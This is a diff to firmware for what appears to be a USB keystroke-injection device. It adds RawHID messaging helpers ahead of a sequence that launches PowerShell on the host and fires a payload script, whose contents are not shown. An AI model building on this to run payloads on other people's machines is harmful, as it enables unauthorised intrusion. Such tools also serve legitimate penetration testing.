@@ -2,6 +2,7 @@
 #include <SD.h>
 #include <SPI.h>
 #include <stdlib.h>
+#include <usb_desc.h>
 #include "main.h"
 #include "payload.h"
 
@@ -77,6 +78,28 @@ int readline(char* dest, int len, usb_serial_class* port){
 	}
 	return (i+1); //return length
 }
+inline char* padmessage(const char* msg){ //this WILL truncate messages longer than 64 bytes
+	char* outmsg = new char[64];
+	int x = strlen(msg);
+	if (x>64){
+		x = 64; //prevent an overflow
+	}
+	for (int i = 0; i<x; i++){
+		outmsg[i]=msg[i];
+	} for(int i = x; i<64; i++){
+		outmsg[i]=0x00; //pad with nulls to fill the message
+	}
+	return outmsg;
+}
+char* rawhid_blocking_rcv(){
+	char* msg = new char[64];
+	while (!RawHID.available()){ //loop if there isn't a message
+		if (RawHID.recv(msg, 0) > 0){
+			break; //if we got a message, return.
+		}
+	}
+	return msg;
+}
 void setup() {
 	delay(100); //delay 100ms, makes it work for some reason
 	Serial1.begin(115200); //hardware UART for debug
@@ -118,6 +141,9 @@ void setup() {
 	Serial1.println("Parsing Config...");
 	readconfig();
 	Serial1.println("Config Parsed. Firing now...");
+	RawHID.send(padmessage("Starting RawHID"),64);
+	char* msg = rawhid_blocking_rcv(); //note that the host WILL need to be running a test script to send something
+	Serial1.println(msg); //print the RawHID message
 	startPowershell();
 	Payload* functions = new Payload("functions.ps1");
 	functions->fire(); //we use this again, so don't free it
